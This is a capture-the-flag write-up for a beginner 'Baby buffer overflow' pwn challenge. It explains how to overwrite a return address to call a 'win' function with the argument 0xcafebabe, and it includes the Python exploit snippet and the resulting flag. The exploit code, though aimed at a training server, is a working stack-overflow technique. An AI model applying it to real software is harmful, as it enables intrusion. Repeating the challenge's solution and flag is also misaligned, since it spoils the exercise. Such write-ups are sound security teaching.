# Baby buffer overflow


**Category:** Pwn

**Points:** 100

**Description:**

We received new message from kackers. They laugh at us being sure that no one will ever be able to break them and even left a description of what needs to be done. Show them what happens to overly confident people!

`nc tasks.open.kksctf.ru 10002`

https://drive.google.com/open?id=1xSswzDDa0lhtGZ2zfhkRr_kNHD0pcdIy

@oldwayfarer

## WriteUp

### Main idea
All you need to do is rewrite return address out of main function with the address of win function and pass a right parameter (`0xcafebabe`)into it.

### Exploitation

First of all we need to obtaion the win function from the given binary with gdb, for example. Then make a payload with a right padding, pass a win fuction address and a the parameter that being required by win.

    s = connect('tasks.open.kksctf.ru', 10002)
    win_addr = p32(0x080485f6) 
    param = p32(0xcafebabe) 
    payload = "a"*260 + win_addr + "aaa" + param
    s.sendline(payload)
    print(s.recvall())

flag: `kks{0v3rf1ow_15_my_1if3}`

Example: [break.py](break.py)
